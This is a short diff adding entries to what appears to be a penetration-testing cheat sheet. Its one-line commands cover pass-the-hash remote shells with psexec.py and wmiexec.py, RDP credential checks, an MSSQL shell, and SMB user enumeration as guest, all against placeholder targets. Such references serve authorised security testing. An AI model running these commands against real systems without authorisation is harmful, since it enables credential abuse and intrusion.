@@ -37,3 +37,18 @@ psexec.py -hashes <ntlmhash>:<ntlmhash> <user>@<target> cmd
 
 # wmi cmd console remote connection
 wmiexec.py -hashes <ntlmhash>:<ntlmhash> <user>@<target> cmd
+
+%rdp
+
+# rdp cred check
+rdp_check <domain>/<name>:<password>@<IP>
+
+% mssql
+
+# Get a mssql shell
+mssqlclient.py <user>@<target>
+
+% smb
+
+# enumerate user via smb with guest
+lookupsid.py guest@<target>
